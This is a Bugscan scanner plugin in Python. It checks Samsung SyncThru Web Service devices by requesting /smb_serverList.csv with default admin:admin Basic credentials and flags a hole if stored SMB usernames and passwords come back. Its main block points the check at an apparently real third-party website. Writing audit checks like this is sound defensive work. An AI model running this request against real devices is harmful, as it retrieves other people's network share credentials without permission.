#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref https://www.bugscan.net/#!/x/22524

def assign(service, arg):
    if service == "syncthru_web_service":
        return True, arg

def audit(arg):
    raw = """GET /smb_serverList.csv HTTP/1.1
Host: www.baidu.com
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36
HTTPS: 1
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8
Cookie: FALSE=TRUE; xuser=webclient; InfoMenu=100; InfoSubMenu=0; SelectedTab=1; SelectedMenu=100; SelectedSubMenu=0

"""
    url  = arg + 'smb_serverList.csv'
    code, head,res, errcode, _ = curl.curl2(url,raw=raw)

    if code == 200 and 'ShareName,Anonymous,UserName,UserPassword' in res and '<' not in res:
        security_hole(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('syncthru_web_service', 'http://lojaeletrosom.com/')[1])

